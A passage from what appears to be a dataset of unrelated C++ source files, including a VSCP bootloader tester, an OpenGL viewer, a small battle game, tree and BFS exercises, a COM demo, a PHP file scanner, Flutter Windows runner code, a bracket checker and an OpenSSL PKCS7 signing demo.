: QApplication(argc, argv)\n{\n  m_bootflag = BOOTLOADER; // Start the bootloader\n\n  m_bootloader_cfg.vscpLevel  = VSCP_LEVEL2;\n  m_bootloader_cfg.blockSize  = 0x100;\n  m_bootloader_cfg.blockCount = 0xffff;\n\n  // Logging defaults\n  m_fileLogLevel   = spdlog::level::info;\n  m_fileLogPattern = \"[%^%l%$] %v\";\n#ifdef WIN32\n  m_fileLogPath = \"btest.log\";\n#else\n  m_fileLogPath = \"~/.local/share/VSCP/btest/logs/btest.log\";\n#endif\n  m_maxFileLogSize  = 5242880;\n  m_maxFileLogFiles = 7;\n\n  m_bEnableConsoleLog = true;\n  m_consoleLogLevel   = spdlog::level::debug;\n  m_consoleLogPattern = \"[btest] [%^%l%$] %v\";\n\n  pClient = nullptr;\n\n  sem_init(&m_semReceiveQueue, 0, 0);\n\n  if (0 != pthread_mutex_init(&m_mutexReceiveQueue, NULL)) {\n    spdlog::error(\"\\n mutex init of input mutex has failed\\n\");\n  }\n}\n\n///////////////////////////////////////////////////////////////////////////////\n// ~btest\n//\n\nbtest::~btest()\n{\n  int rv;\n\n  // pthread_cancel(m_threadWork);\n  m_bRun = false;\n  pthread_join(m_threadWork, NULL);\n\n  // if (VSCP_ERROR_SUCCESS != (rv = vscpboot_release_hardware())) {\n  //   spdlog::error(\"Failed to release hardware rv={}\", rv);\n  //   return;\n  // }\n\n  while (!m_inqueue.isEmpty()) {\n    vscpEventEx* pex = m_inqueue.dequeue();\n    delete pex;\n  }\n\n  sem_destroy(&m_semReceiveQueue);\n  pthread_mutex_destroy(&m_mutexReceiveQueue);\n}\n\n///////////////////////////////////////////////////////////////////////////////\n// startWorkerThread *\n//\n\nint\nbtest::startWorkerThread(void)\n{\n  // Start the bootloader workerthread\n  m_bRun = true; // Workerthread should run, run, run...\n  if (pthread_create(&m_threadWork, NULL, workerThread, this)) {\n    spdlog::critical(\"BTEST: Failed to start workerthread\");\n    return VSCP_ERROR_ERROR;\n  }\n  return VSCP_ERROR_SUCCESS;\n}\n\n///////////////////////////////////////////////////////////////////////////////\n// loadSettings *\n//\n\nvoid\nbtest::loadSettings(void)\n{\n  QString str;\n\n  QSettings settings(QCoreApplication::organizationName(),\n                     QCoreApplication::applicationName());\n\n  // Configuration folder\n  // --------------------\n  // Linux: \"/home/akhe/.config\"                      Config file is here\n  // (VSCP/vscp-works-qt) Windows:\n  {\n    QString path =\n      QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);\n    path += \"/\";\n    path += QCoreApplication::applicationName();\n    path += \"/\";\n    m_configFolder = settings.value(\"configFolder\", path).toString();\n  }\n\n  // Share folder\n  // ------------\n  // Linux: \"/home/akhe/.local/share/vscp-works-qt\"   user data is here\n  // Windows:\n  {\n    QString path =\n      QStandardPaths::writableLocation(QStandardPaths::AppLocalDataLocation);\n    path += \"/\";\n    m_shareFolder = settings.value(\"shareFolder\", path).t",
    "#include <iostream>\n#include <glad/glad.h>\n#include <GLFW/glfw3.h>\n\n#include <glm/glm.hpp>\n#include <glm/gtc/matrix_transform.hpp>\n#include <glm/gtc/type_ptr.hpp>\n\n#include <unistd.h>\n\n#include \"./shaders/FragShader.hpp\"\n#include \"./shaders/VertShader.hpp\"\n#include \"./shaders/ShaderProgram.hpp\"\n\n#include \"./buffers/VAO.hpp\"\n#include \"./buffers/VBO.hpp\"\n#include \"./buffers/EBO.hpp\"\n\n#include \"./obj/Board.hpp\"\n#include \"./obj/Lines.hpp\"\n#include \"./obj/Cube.hpp\"\n\n#include \"./camera/camera.hpp\"\n\n#include \"./debug/debug.hpp\"\n\nusing namespace std;\n\nvoid mouse_callback(GLFWwindow* window, double xpos, double ypos) {}\n\nvoid handleEvents(GLFWwindow *window){\n    \n    if(glfwGetKey(window, GLFW_KEY_UP)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(0.0f, -0.01f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_RIGHT)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(-0.01f, 0.0f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_LEFT)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(0.01f, 0.0f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_DOWN)==GLFW_PRESS){\n        view = glm::translate(view, glm::vec3(0.0f, 0.01f, 0.0f));\n    }\n    else if(glfwGetKey(window, GLFW_KEY_S)==GLFW_PRESS){\n        zoom-=0.01f;\n        if(zoom<=0.1f){\n            zoom=0.1f;\n        }\n        projection = glm::perspective(glm::radians(45.0f*zoom), 1.0f, 0.1f, 100.0f);\n    }\n    else if(glfwGetKey(window, GLFW_KEY_W)==GLFW_PRESS){\n        zoom+=0.01f;\n        if(zoom>=3){\n            zoom=3.0f;\n        }\n        projection = glm::perspective(glm::radians(45.0f*zoom), 1.0f, 0.1f, 100.0f);\n    }\n}\n\nint main(){\n    glfwInit();\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\n    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);\n    GLFWwindow* window = glfwCreateWindow(800, 800, \"Title\", NULL, NULL);\n    if(window==NULL){\n        cerr << \"error creating window\" << endl;\n        return -1;\n    }\n    glfwMakeContextCurrent(window);\n    if(!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress)){\n        cerr << \"Failed to initialize GLAD\" << endl;\n        return -1;\n    }\n\n    glViewport(0, 0, 800, 800);\n    //glfwSetCursorPosCallback(window, mouse_callback);\n\n    VertShader vertShader;\n    FragShader fragShader;\n\n    ShaderProgram shaderProgram;\n    shaderProgram.attachShader(vertShader.compileShader(), fragShader.compileShader());\n\n    vertShader.deleteShader();\n    fragShader.deleteShader();\n\n    //Board board;\n    Lines lines;\n    Cube cube;\n\n    glEnable(GL_DEPTH_TEST);\n\n    unsigned int modelLoc = glGetUniformLocation(shaderProgram.getProgram(), \"model\");\n    unsigned int viewLoc = glGetUniformLocation(shaderProgram.getProgram(), \"view\");\n    unsigned int projectionLoc = glGetUniformLocation(shaderProgram.getProgram(), \"projection\");\n    \n    while(!glfwWindowShouldClose(window)){\n        handleEvents(window);\n        glClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n        shaderProgram.useProgram();\n\n        glUniformMatrix4fv(modelLoc, 1, GL_FALSE, glm::value_ptr(model));\n        glUniformMatrix4fv(viewLoc, 1, GL_FALSE, glm::value_ptr(view));\n        glUniformMatrix4fv(projectionLoc, 1, GL_FALSE, glm::value_ptr(projection));\n\n        lines.renderLines();\n        //board.renderBoard();\n        cube.renderCube();\n        \n        cout << zoom << endl;\n\n        glfwSwapBuffers(window);\n        glfwPollEvents();\n    }\n    //board.deleteBoard();\n    shaderProgram.deleteProgram();\n    glfwDestroyWindow(window);\n    glfwTerminate();\n\n    return 0;\n}\n\n",
    "#include <iostream>\n#include \"Ele.h\"\n#include \"Move.h\"\n#include \"AllMoves.h\"\n#include \"AllEles.h\"\n#include \"AllWielders.h\"\n#include \"utils.h\"\n\nmap<string, Ele> elesOfAllGame;\nmap<string, Move> moves;\nmap<string, Wielder> allWielders;\nWielder currentOpponent;\n\nvoid StartDuel();\nbool StartTurn();\nvoid StartRun();\n\nint main()\n{\n    AllMoves::InitAllMoves();\n    AllEles::InitAllEles();\n    AllWielders::InitAllWielders();\n    elesOfAllGame = AllEles::allEles;\n    moves = AllMoves::allMoves;\n    allWielders = AllWielders::allWielders;\n    \n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move1\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move3\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move5\"]);\n    elesOfAllGame[\"Ele1\"].Moves().push_back(moves[\"move6\"]);\n\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move2\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move4\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move5\"]);\n    elesOfAllGame[\"Ele2\"].Moves().push_back(moves[\"move7\"]);\n\n    player.Eles().push_back(elesOfAllGame[\"Ele1\"]);\n    allWielders[\"wielder1\"].Eles().push_back(elesOfAllGame[\"Ele2\"]);\n\n    StartRun();\n\n    StartDuel();\n    bool inCombat = true;\n\n    do\n    {\n        inCombat = StartTurn();\n    } while (inCombat);\n\n    PrintText(\"YOU FINISHED THE GAME!\");\n\n\n}\n\nvoid StartRun() {\n    PrintText(\"What's your name?\");\n    cin >> player.Name();\n}\n\nvoid StartDuel() {\n    allWielders[\"wielder1\"].Eles()[0].State() = Ele::EleState::InCombat;\n    currentOpponent = allWielders[\"wielder1\"];\n    PrintText(currentOpponent.Name() + \" sends \" + allWielders[\"wielder1\"].Eles()[0].Name() + \"!\");\n    PrintText(\"Which one will you choose?\");\n    player.SelectEle();\n   \n}\n\nbool StartTurn() {\n    bool startAnotherTurn = true;\n    int playerChoice;\n    int playerMove;\n    int opponentMove = RandomNumber(0, currentOpponent.GetEleInCombat().Moves().size() -1);\n    PrintText(\"What will you do?\");\n    PrintText(\"1. Select Move\");\n    cin >> playerChoice;\n    if (playerChoice == 1)\n    {\n        playerMove = player.SelectMove();\n    }\n\n    if (player.GetEleInCombat().Speed() >= currentOpponent.GetEleInCombat().Speed())\n    {\n        player.GetEleInCombat().Moves()[playerMove].UseMovement(player.GetEleInCombat(), currentOpponent.GetEleInCombat());\n        if (currentOpponent.HasEleInCombat()) {\n            currentOpponent.GetEleInCombat().Moves()[opponentMove].UseMovement(currentOpponent.GetEleInCombat(), player.GetEleInCombat());\n        }\n    }\n    else if (player.GetEleInCombat().Speed() < currentOpponent.GetEleInCombat().Speed())\n    {\n        currentOpponent.GetEleInCombat().Moves()[opponentMove].UseMovement(currentOpponent.GetEleInCombat(), player.GetEleInCombat());\n        if (player.HasEleInCombat()) {\n            player.GetEleInCombat().Moves()[playerMove].UseMovement(player.GetEleInCombat(), currentOpponent.GetEleInCombat());\n        }\n    }\n\n\n    if (!currentOpponent.HasEleInCombat()) {\n        if (currentOpponent.AllElesDead()) {\n            PrintText(\"You win!\");\n            startAnotherTurn = false;\n        }\n        else {\n            for (unsigned int i = 0; i < currentOpponent.Eles().size(); i++)\n            {\n                Ele& ele = currentOpponent.Eles()[i];\n                if (ele.State() == Ele::EleState::InParty) {\n                    ele.State() = Ele::EleState::InCombat;\n                    i = currentOpponent.Eles().size();\n                }\n            }\n        }\n    }\n\n    if (!player.HasEleInCombat()) {\n        if (player.AllElesDead()) {\n            PrintText(\"You have no Eles to fight with!\");\n            PrintText(\"You lose!\");\n            startAnotherTurn = false;\n        }\n        else {\n            player.SelectEle();\n        }\n    }\n\n    return startAnotherTurn;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <stack>\nusing namespace std;\n\n// \u0110\u1ecbnh ngh\u0129a c\u1ea5u tr\u00fac c\u1ee7a m\u1ed9t n\u00fat trong c\u00e2y\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode(int x) : val(x), left(NULL), right(NULL) {}\n};\n\nvector<int> postorderTraversal(TreeNode* root) {\n    vector<int> result;\n    if (root == NULL) \n        return result;\n    \n    stack<TreeNode*> s;\n    TreeNode* current = root;\n    TreeNode* lastVisited = NULL;\n    \n    while (current != NULL || !s.empty()) {\n        if (current != NULL) {\n            s.push(current);\n            current = current->left;\n        }\n        else {\n            TreeNode* topNode = s.top();\n            if (topNode->right != NULL && lastVisited != topNode->right) {\n                current = topNode->right;\n            } else {\n                result.push_back(topNode->val);\n                lastVisited = topNode;\n                s.pop();\n            }\n        }\n    }\n    \n    return result;\n}\n\n// H\u00e0m main \u0111\u1ec3 ki\u1ec3m tra\nint main() {\n    TreeNode* root = new TreeNode(1);\n    root->right = new TreeNode(2);\n    root->right->left = new TreeNode(3);\n    \n    vector<int> result = postorderTraversal(root);\n    \n    cout << \"Postorder Traversal: \";\n    for (int i = 0; i < result.size(); i++) {\n        cout << result[i] << \" \";\n    }\n    cout << endl;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <objbase.h>\r\n\r\ninterface IX : IUnknown {\r\n    virtual void MethodX() = 0;\r\n};\r\n\r\ninterface IY : IUnknown {\r\n    virtual void MethodY() = 0;\r\n};\r\n\r\ninterface IZ : IUnknown {\r\n    virtual void MethodZ() = 0;\r\n};\r\n\r\nclass CA : public IX, public IY {\r\npublic:\r\n    STDMETHOD(QueryInterface)(REFIID riid, void** ppvObject) {\r\n        if (riid == IID_IUnknown) {\r\n            *ppvObject = static_cast<IUnknown*>(this);\r\n        }\r\n        else if (riid == IID_IX) {\r\n            *ppvObject = static_cast<IX*>(this);\r\n        }\r\n        else if (riid == IID_IY) {\r\n            *ppvObject = static_cast<IY*>(this);\r\n        }\r\n        else {\r\n            *ppvObject = NULL;\r\n            return E_NOINTERFACE;\r\n        }\r\n\r\n        static_cast<IUnknown*>(*ppvObject)->AddRef();\r\n        return S_OK;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, AddRef)() {\r\n        return ++m_RefCount;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, Release)() {\r\n        if (--m_RefCount == 0) {\r\n            delete this;\r\n            return 0;\r\n        }\r\n        return m_RefCount;\r\n    }\r\n\r\n    void MethodX() override {\r\n        std::cout << \"MethodX called.\" << std::endl;\r\n    }\r\n\r\n    void MethodY() override {\r\n        std::cout << \"MethodY called.\" << std::endl;\r\n    }\r\n\r\nprivate:\r\n    ULONG m_RefCount = 1;\r\n};\r\n\r\nIUnknown* CreateInstance() {\r\n    CA* pCA = new CA();\r\n    return static_cast<IUnknown*>(pCA);\r\n}\r\n\r\nint main() {\r\n    CoInitialize(NULL);\r\n\r\n    IUnknown* pIUnknown = CreateInstance();\r\n    if (pIUnknown == nullptr) {\r\n        std::cerr << \"Failed to create instance.\" << std::endl;\r\n        CoUninitialize();\r\n        return 1;\r\n    }\r\n\r\n    IX* pIX = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IX, reinterpret_cast<void**>(&pIX)))) {\r\n        pIX->MethodX();\r\n        pIX->Release();\r\n    }\r\n\r\n    IY* pIY = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IY, reinterpret_cast<void**>(&pIY)))) {\r\n        pIY->MethodY();\r\n        pIY->Release();\r\n    }\r\n\r\n    IZ* pIZ = NULL;\r\n    if (FAILED(pIUnknown->QueryInterface(IID_IZ, reinterpret_cast<void**>(&pIZ)))) {\r\n        std::cout << \"Component does not support IZ interface.\" << std::endl;\r\n    }\r\n\r\n    pIUnknown->Release();\r\n    CoUninitialize();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <cstdio>\n#include <string>\n\nstd::vector<std::string> fileList;\nstd::vector<std::string> phpFilter;\nstd::vector<std::string> warningList;\nint returnCode = 0;\n\nvoid createPhpFilter() {\n    std::ifstream conf(\"phpFilter.wwwqr\");\n    if (!conf.is_open()) {\n        std::cout << \"\\n\\nCould not open phpFilter.wwwqr.\\n\\n\";\n        return;\n    }\n    std::string line;\n    while(std::getline(conf, line)) {\n        phpFilter.emplace_back(line);\n    }\n    conf.close();\n}\n\nvoid createFilters() {\n    createPhpFilter();\n}\n\nstd::string exec(const char* cmd) {\n    FILE* pipe = popen(cmd, \"r\");\n    if (!pipe) return \"ERROR\";\n    char buffer[128];\n    std::string result = \"\";\n    while (!feof(pipe)) {\n        if (fgets(buffer, 128, pipe) != NULL)\n            result += buffer;\n    }\n    pclose(pipe);\n    return result;\n}\n\nstd::string getExtentionName(std::string path) {\n    int pos = path.find_last_of('.');\n    if (pos != std::string::npos) {\n        return path.substr(pos + 1);\n    }\n    return \"\";\n}\n\nvoid setFileList() {\n    fileList.clear();\n    std::string tmpStr = exec(\"find ../ -type f\");\n    std::string cache = \"\";\n    for (char c : tmpStr) {\n        if (c == '\\n') {\n            fileList.emplace_back(cache);\n            cache = \"\";\n        }\n        else {\n            cache += c;\n        }\n    }\n}\n\nvoid checkFiles(const std::string &whitelistPath) {\n    for (auto& str : fileList) {\n        std::ifstream file(str);\n        std::string line;\n        if (!file.is_open()) {\n            continue;\n        }\n        //whitelist check\n        std::ifstream whitelist((\"../\" + whitelistPath).c_str());\n\n        if (whitelist.is_open()) {\n            std::string tmpWLine;\n            bool isWhite = false;\n            while (std::getline(whitelist, tmpWLine)) {\n                if (str == tmpWLine) {\n                    isWhite = true;\n                    break;\n                }\n            }\n            whitelist.close();\n            if (isWhite) {\n                continue;\n            }\n        }\n        else {\n            std::cout << \"\\n\\n\" << whitelistPath << \" file not found.\\n\\n\";\n        }\n        //\n        int lineCount = 0;\n        while (std::getline(file, line)) {\n            ++lineCount;\n            if (getExtentionName(str) == \"php\") {\n                for (auto& val : phpFilter) {\n                    int tmpP = line.find(val);\n                    if (tmpP != std::string::npos) {\n                        warningList.emplace_back(\"Error at line \" + std::to_string(lineCount) + \" in '\" + str + \"' Filter: (\" + val + \")\\n\");\n                        if (returnCode == 0) {\n                            returnCode = 1;\n                        }\n                    }\n                }\n            }\n        }\n        file.close();\n    }\n}\n\nint main(int argc, char* argv[]) {\n    if (argc < 2) {\n        throw std::runtime_error(\"Error: no whitelist argument given.\\n\");\n    }\n    setFileList();\n    createFilters();\n    checkFiles(argv[1]);\n    for (auto& str : warningList) {\n        std::cout << str;\n    }\n    return returnCode;\n}\n",
    "/*\nThe height of a node is the number of edges in\nits longest chain of descendants.\n\nImplement computeHeight to compute the height\nof the subtree rooted at the node n. Note that\nthis function does not return a value. You should\nstore the calculated height in that node's own\nheight member variable. Your function should also\ndo the same for EVERY node in the subtree rooted\nat the current node. (This naturally lends itself\nto a recursive solution!)\n\nAssume that the following includes have already been\nprovided. You should not need any other includes\nthan these.\n\n#include <cstdio>\n#include <cstdlib>\n#include <iostream>\n#include <string>\n\nYou have also the following class Node already defined.\nYou cannot change this class definition, so it is\nshown here in a comment for your reference only:\n\nclass Node {\npublic:\n  int height; // to be set by computeHeight()\n  Node *left, *right;\n  Node() { height = -1; left = right = nullptr; }\n  ~Node() {\n    delete left;\n    left = nullptr;\n    delete right;\n    right = nullptr;\n  }\n};\n*/\n\nvoid computeHeight(Node *n) {\n  if (!n) {\n    return;\n  }\n  n->height = 0;\n  computeHeight(n->left);\n  computeHeight(n->right);\n\n  int lh = (n->left) ? (n->left->height) : 0;\n  int rh = (n->right) ? (n->right->height) : 0;\n  if (n->left || n->right) {\n    n->height += 1 + std::max(lh, rh);\n  }\n  \n}\n\n// This function prints the tree in a nested linear format.\nvoid printTree(const Node *n) {\n  if (!n) return;\n  std::cout << n->height << \"(\";\n  printTree(n->left);\n  std::cout << \")(\";\n  printTree(n->right);\n  std::cout << \")\";\n}\n\n// The printTreeVertical function gives you a verbose,\n// vertical printout of the tree, where the leftmost nodes\n// are displayed highest. This function has already been\n// defined in some hidden code.\n// It has this function prototype: void printTreeVertical(const Node* n);\n\n// This main() function is for your personal testing with\n// the Run button. When you're ready, click Submit to have\n// your work tested and graded.\nint main() {\n\n  Node *n = new Node();\n  n->left = new Node();\n  n->right = new Node();\n  n->right->left = new Node();\n  n->right->right = new Node();\n  n->right->right->right = new Node();\n\n  computeHeight(n);\n\n  printTree(n);\n  std::cout << std::endl << std::endl;\n  printTreeVertical(n);\n  \n  // The Node destructor will recursively\n  // delete its children nodes.\n  delete n;\n  n = nullptr;\n\n  return 0;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"zoolingua\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nint Visit[100];       // Declare an array to keep track of visited nodes.\n\nint Graph[101][101];        // Declare a 2D array for the graph representation.\n\nint n , e ;\n\nvoid Bfs(int Start)\n{\n    Visit[Start] = 1;\n    cout << Start << \" \";\n\n    queue<int> Que;\n    Que.push(Start);        // Add the starting node to the queue.\n\n    while (!Que.empty())    // Perform BFS while the queue is not empty.\n    {\n        int x = Que.front();         // Get the front element of the queue.\n        Que.pop();                  // Remove the front element from the queue.\n\n        for (int j = 1; j <= n; j++)   // Iterate through all nodes (j) in the graph.\n        {\n            if (Graph[x][j] != 0 && Visit[j] == 0)  // Check if there is an edge between node x and node j, and\n                                                      //  if node j has not been visited.\n            {\n                Visit[j] = 1;       // Mark node j as visited.\n                cout << j << \" \";   // Print node j.\n\n                Que.push(j);        // Add node j to the queue for further exploration.\n            }\n        }\n    }\n}\nint main()\n{\n\n    cin >> n >> e;  // Read the number of nodes (n) and edges (e) from the user.\n\n    int u, v;   // Read the edge connections and build the graph.\n    for (int i = 1; i <= e; i++)\n    {\n        cin >> u >> v;\n        Graph[u][v] = 1;    // Mark the presence of an edge between nodes u and v.\n        Graph[v][u] = 1;\n    }\n    int Start_Node; // Declare a variable to store the starting node for BFS.\n    cout << \"Choose your start Node: \";\n    cin >> Start_Node;\n\n    Bfs(Start_Node);    // Call the BFS function with the chosen starting node.\n\n    return 0;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Stack \n{\nprivate:\n    char* stackArray;\n    int top;\n    int capacity;\n\npublic:\n    Stack(int size) \n    {\n        stackArray = new char[size];\n        top = -1;\n        capacity = size;\n    }\n\n    ~Stack() \n    {\n        delete[] stackArray;\n    }\n\n    bool isEmpty() const \n    {\n        return top == -1;\n    }\n\n    void push(char ch) \n    {\n        if (top < capacity - 1) \n        {\n            stackArray[++top] = ch;\n        }\n    }\n\n    char pop() \n    {\n        if (top >= 0) \n        {\n            return stackArray[top--];\n        }\n        return '\\0';\n    }\n\n    char peek() const \n    {\n        if (top >= 0) \n        {\n            return stackArray[top];\n        }\n        return '\\0';\n    }\n};\n\nint main() \n{\n    string input;\n    cout << \"Enter a string: \";\n    getline(cin, input);\n\n    Stack stack(input.size());\n    size_t errorIndex = input.size();\n    bool isBalanced = true;\n\n    for (size_t i = 0; i < input.size(); ++i) \n    {\n        char ch = input[i];\n\n        if (ch == '(' || ch == '[' || ch == '{') \n        {\n            stack.push(ch);\n        }\n        else if (ch == ')' || ch == ']' || ch == '}') \n        {\n            if (stack.isEmpty()) \n            {\n                isBalanced = false;\n                errorIndex = i;\n                break;\n            }\n            else \n            {\n                char top = stack.peek();\n                if ((ch == ')' && top != '(') ||\n                    (ch == ']' && top != '[') ||\n                    (ch == '}' && top != '{')) {\n                    isBalanced = false;\n                    errorIndex = i;\n                    break;\n                }\n                stack.pop();\n            }\n        }\n        else if (ch == ';') \n        {\n            break;\n        }\n    }\n\n    if (isBalanced && stack.isEmpty()) \n    {\n        cout << \"The string is correct.\" << endl;\n    }\n    else \n    {\n        if (errorIndex < input.size()) \n        {\n            cout << \"Incorrect string up to the first error: \" << input.substr(0, errorIndex + 1) << endl;\n        }\n        else \n        {\n            cout << \"Incorrect string: not all brackets are balanced\" << endl;\n        }\n    }\n}\n\n",
    "\ufeff// openssl.cpp: \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\u70b9\u3002\n//\n\n#include<iostream>\n#include<memory>\n\n#include\"openssl.h\"\n#include\"utils/file_utils.h\"\nusing namespace std;\n\nint test()\n{\n\tstd::cout << \"test\" << std::endl;\n\treturn 0;\n}\nint main()\n{\n\tX509* cert = NULL;\n\tEVP_PKEY* privateKey = NULL;\n\tBIO* memBio = NULL;\n\tPKCS7* p7 = NULL;\n\tint result = 0;\n\tBIO* output = NULL;\n\tchar buf[5] = { 0 };\n\tsize_t readByts = 0;\n\tstd::string ret;\n\n\tstd::string content = \"byebye\"; \n\tcert = readCert(\"/home/xingxing/opensslKeyAndCeritificate/ecdsa_cert.pem\");\n\tif (cert == NULL)return -1;\n\tprivateKey = readPrivateKey(\"/home/xingxing/opensslKeyAndCeritificate/private.key\"); if (privateKey == NULL)return -1;\n\tmemBio = BIO_new_mem_buf(content.data(), content.size()); if (memBio == NULL)return -1;\n\tp7 = PKCS7_sign(cert, privateKey, NULL, memBio, 0); if (p7 == NULL)return -1;\n\tresult=PKCS7_verify(p7, NULL, NULL, NULL, NULL, PKCS7_NOVERIFY);\n\tif (result == 1)\n\t{\n\t\tstd::cout << \"verified success!\" << std::endl;\n\t}\n\telse {\n\t\tstd::cout<<(\"verified failed\") << std::endl;\n\t}\n\toutput=PKCS7_dataDecode(p7, NULL, NULL, NULL);\n\n\twhile ((result = BIO_read_ex(output, buf, sizeof(buf), &readByts))==1)\n\t{\n\t\tret.append(buf,readByts);\n\t}\n\tstd::cout << \"ret size:\" << ret.size() << std::endl;\n\tstd::cout <<\"content:\"<< ret << std::endl;\n\n\t/*size_t written = 